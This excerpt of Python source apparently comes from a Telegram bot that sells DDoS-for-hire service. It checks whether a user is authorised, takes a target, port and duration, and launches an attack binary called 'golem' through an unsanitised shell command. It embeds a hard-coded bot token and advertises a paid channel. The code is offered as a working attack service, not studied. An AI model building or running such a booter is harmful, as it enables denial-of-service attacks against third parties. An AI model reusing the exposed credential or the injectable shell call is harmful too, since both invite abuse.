...
bot = telebot.TeleBot('7742384085:AAGFYMt6QOvi7PoEK2xjLFj9S0KXlaOJHNU')
    ...
    if user_id in allowed_user_ids:
        ...
        if len(command) == 4:  # Updated to accept target, time, and port
            ...
            if time > 300:
                ...
                full_command = f"./golem {target} {port} {time}"
                subprocess.run(full_command, shell=True)
                response = f"\n✅Attack Finished✅"
        else:
            response = "Usage :- /attack <target> <port> <time>\njoin https://t.me/golemxddos"  # Updated command syntax
    else:
        response = "You Are Not User's To Authorized To Use This Command.\nBy STORM BOT DM TO GET ACCESS @GOLEM_OWNER"
...
PRICES CHANNEL MAI UPLOADED HAI BRO
https://t.me/golemxddos
'''
    bot.reply_to(message, response)
